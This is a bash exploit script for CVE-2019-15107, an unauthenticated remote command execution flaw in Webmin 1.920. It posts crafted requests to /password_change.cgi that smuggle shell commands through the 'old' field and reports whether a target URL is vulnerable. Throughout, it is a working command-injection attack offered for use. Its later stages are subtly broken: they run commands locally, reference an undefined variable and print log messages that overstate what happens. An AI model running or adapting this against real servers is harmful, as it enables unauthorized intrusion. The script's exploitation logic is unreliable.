#!/bin/bash

# Author: K3ysTr0K3R
# CVE-2019-15107 Webmin Unauhenticated Remote Command Execution
# Afected version: Webmin 1.920
# Usage: ./CVE-2019-15107.sh https://target:port
# Example: ./CVE-2019-15107.sh https://localhost:10000

Y='\e[33m'
G='\e[32m'
B='\e[34m'
R='\e[31m'
W='\e[97m'
C='\e[36m'

time_date=$(date +%H:%M:%S)

URL=$1
FLAG="f3a0c13c3765137bcde68572707ae5c0"
echo ""
echo -e "${C}[$time_date] ${G}[INFO] ${B}- ${W}Testing for RCE on $URL"
curl -ks $URL'/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=id|echo '$FLAG'&new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H "Content-Type: application/x-www-form-urlencoded" -H 'Referer: '$URL'/session_login.cgi'|grep $FLAG>/dev/null 2>&1

if [ $? -eq 0 ]; then
        echo ""
	echo -e "${C}[$time_date] ${G}[INFO] ${C}[VULNERABLE] ${B}- ${W}$URL"
	# Inject ifconfig command for testing.
	ifconfig=$(ifconfig)
	send_post_request=$(curl -k -s -X POST "$URL/password_change.cgi" \
		-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" \
		-H "Accept-Language: en-US,en;q=0.9" \
		-H "Cache-Control: max-age=0" \
		-H "Connection: keep-alive" \
		-H "Content-Type: application/x-www-form-urlencoded" \
		-H "Cookie: redirect=1; testing=1" \
		-H "Origin: $URL" \
		-H "Referer: $URL/session_login.cgi" \
		-H "Upgrade-Insecure-Requests: 1" \
		-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" \
		--data-raw "user=wheel&pam=&expired=2&old=id|echo $ifconfig&new1=wheel&new2=wheel" \
		--compressed \
		--insecure)
			test_exploit=$(echo "$send_post_request" | grep "Failed to change password : The current password is incorrect")
			echo -e "${C}[$date_time] ${G}[INFO] ${C}[TESTING-EXPLOIT] ${B}- ${W}$URL"
			if [ "$test_exploit" ]; then
				echo -e "${C}[$date_time] ${G}[INFO] ${C}[EXPLOITABLE] ${B}- ${W}$URL"
                                echo "$send_post_request"
                                echo -e "${C}[$date_time] ${G}[INFO] ${C}[EXPLOITING] ${B}- ${W}$URL"
				user=$(whoami)
				system=$(uname)
				current_dir=$(pwd)
				list=$(ls)
				exploit=$(curl -k -s -X POST "$URL/password_change.cgi" \
					-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" \
					-H "Accept-Language: en-US,en;q=0.9" \
					-H "Cache-Control: max-age=0" \
					-H "Connection: keep-alive" \
					-H "Content-Type: application/x-www-form-urlencoded" \
					-H "Cookie: redirect=1; testing=1" \
					-H "Origin: $URL" \
					-H "Referer: $URL/session_login.cgi" \
					-H "Upgrade-Insecure-Requests: 1" \
					-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" \
					--data-raw "user=wheel&pam=&expired=2&old=id|echo $whoami; $system; $current_dir; $list&new1=wheel&new2=wheel" \
					--compressed \
					--insecure)
				echo -e "${C}[$date_time] ${G}[INFO] ${C}[EXPLOITING] ${B}- ${W}$URL ${B}- ${W}Injecting the following commands: whoami, uname, pwd, ls"
			else
				echo -e "${C}[$date_time] ${G}[INFO] ${C}[NOT-EXPLOITABLE] ${B}- ${W}$URL"
			fi
else
        echo ""
	echo -e "${C}[$time_date] ${Y}[WARNING] ${R}[NOT-VULNERABLE] ${B}- ${W}$URL"
	exit
fi
